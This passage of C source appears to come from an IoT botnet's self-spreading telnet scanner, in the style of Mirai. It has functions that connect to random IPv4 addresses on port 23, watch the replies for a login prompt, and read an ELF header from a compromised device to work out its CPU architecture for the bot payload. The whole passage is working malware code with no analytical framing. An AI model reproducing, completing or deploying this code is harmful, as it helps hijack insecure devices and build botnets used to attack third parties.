static BOOL read_response(struct scan_struct *fd, uint8_t id)
{
	util_null(fd->buf, 0, SCANNER_BUF_SIZE);

	fd_set read_set;
	int ret = 0;
	struct timeval timeout;

	timeout.tv_sec = 0;
	timeout.tv_usec = 100;

	FD_ZERO(&read_set);
	FD_SET(fd->fd, &read_set);

	ret = select(fd->fd + 1, &read_set, NULL, NULL, &timeout);
	if(ret <= 0)
		return FALSE;

	ret = recv(fd->fd, fd->buf, SCANNER_BUF_SIZE, 0);
	if(ret <= 0)
		return FALSE;

	if(contains_prompt(fd, id))
		return TRUE;

	return FALSE;
}

static void establish_connection(struct scan_struct *fd)
{
	struct sockaddr_in addr;
	BOOL done = fd->complete == 1 ? TRUE : FALSE;

	if(done)
		util_null(fd, 0, sizeof(struct scan_struct));

	addr.sin_family = AF_INET;
	addr.sin_port = htons(23);
	if(done)
		addr.sin_addr.s_addr = get_random_ip();
	else
		addr.sin_addr.s_addr = fd->destination_addr;

	fd->destination_addr = addr.sin_addr.s_addr;
	fd->destination_port = addr.sin_port;

	// Build the socket
	if((fd->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
		return;
		
	// Put the socket into non-blocking mode for non-blocking connects
	fcntl(fd->fd, F_SETFL, O_NONBLOCK | fcntl(fd->fd, F_GETFL, 0));

	errno = 0;
	if(connect(fd->fd, (struct sockaddr_in *)&addr, sizeof(addr)) == -1 && errno != EINPROGRESS)
	{
		reset_state(fd, 1, 0, 0);
		return;
	}

	update_state(fd, CONNECTION_SELECT);
}

static BOOL parse_elf_response(struct scan_struct *fd)
{
	int i = 0;
	char *elf_magic = "\x7f\x45\x4c\x46";
	int pos = 0;
	char *tmp;

	for(i = 0; i < SCANNER_BUF_SIZE; i++)
	{
		if(fd->buf[i] == elf_magic[pos])
		{
			if(++pos == 4)
			{
				pos = i;
				break;
			}
		}
		else
		{
			pos = 0;
		}
	}

	if(pos == 0)
		return FALSE;

	fd->bit = fd->buf[pos + 0x01];
	fd->endianness = fd->buf[pos + 0x02];
	fd->machine = fd->buf[pos + 0xF];

	if(fd->machine == EM_NONE)
		return FALSE;

	if(fd->machine == EM_ARM)
		tmp = "arm";
	else if(fd->machine == EM_SPARC)
		tmp = "sparc";
	else if(fd->machine == EM_386)
		tmp = "i686";
	else if(fd->machine == EM_68K)
		tmp = "m68k";
	else if(fd->machine == EM_PPC)
		tmp = "powerpc";
	else if(fd->machine == EM_SH)
		tmp = "superh";
	else if(fd->machine == EM_X86_64)
		tmp = "x86_64";
	else if(fd->machine == EM_MIPS && fd->endianness != ENDIAN_LITTLE)
		tmp = "mips";
	else if(fd->machine == EM_MIPS && fd->endianness == ENDIAN_LITTLE)
		tmp = "mipsel";
	else
		return FALSE;

	util_memcpy(fd->arch, tmp, util_strlen(tmp));
	return TRUE;
}

